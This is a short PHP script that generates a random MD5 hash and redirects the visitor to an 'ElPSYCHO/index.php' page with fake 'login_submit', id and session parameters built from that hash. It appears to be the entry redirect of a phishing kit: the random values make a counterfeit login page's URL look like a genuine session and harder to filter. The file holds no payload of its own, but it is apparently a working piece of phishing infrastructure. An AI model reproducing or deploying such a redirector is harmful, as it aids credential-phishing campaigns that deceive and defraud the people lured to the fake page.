<?php
	
	$praga=rand();
	$praga=md5($praga);

	header("location: ElPSYCHO/index.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>